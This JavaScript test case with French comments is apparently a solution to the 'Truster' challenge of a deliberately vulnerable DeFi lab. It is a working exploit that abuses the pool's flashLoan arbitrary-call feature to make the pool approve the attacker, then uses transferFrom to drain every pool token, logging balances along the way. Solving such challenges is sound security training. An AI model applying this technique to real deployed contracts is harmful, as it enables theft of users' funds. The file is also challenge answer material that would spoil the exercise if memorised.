/**
 * Exploit pour la vulnérabilité Truster
 * 
 * Cette exploitation utilise la possibilité d'exécuter un appel arbitraire
 * via la fonction flashLoan pour faire approuver l'attaquant à dépenser
 * tous les tokens du pool, puis les voler avec transferFrom.
 */

it('Exploit', async function () {
    console.log('Solde initial du pool:', (await this.token.balanceOf(this.pool.address)).toString());
    console.log('Solde initial de l\'attaquant:', (await this.token.balanceOf(attacker)).toString());
    
    // 1. Encoder l'appel à approve(attacker, TOKENS_IN_POOL)
    const approvePayload = this.token.contract.methods.approve(
        attacker, 
        TOKENS_IN_POOL.toString()
    ).encodeABI();

    // 2. Exécuter le flash loan avec un emprunt de 0 DVT
    await this.pool.flashLoan(
        0, // Montant emprunté = 0
        attacker, // Adresse emprunteuse (peut être n'importe quelle adresse)
        this.token.address, // Contrat DVT à appeler
        approvePayload, // Données : approve(attacker, 1M DVT)
        { from: attacker }
    );

    console.log('Allowance après flashLoan:', 
        (await this.token.allowance(this.pool.address, attacker)).toString());
    
    // 3. Transférer les jetons approuvés hors du pool
    await this.token.transferFrom(
        this.pool.address,
        attacker,
        TOKENS_IN_POOL,
        { from: attacker }
    );
    
    console.log('Solde final du pool:', (await this.token.balanceOf(this.pool.address)).toString());
    console.log('Solde final de l\'attaquant:', (await this.token.balanceOf(attacker)).toString());
});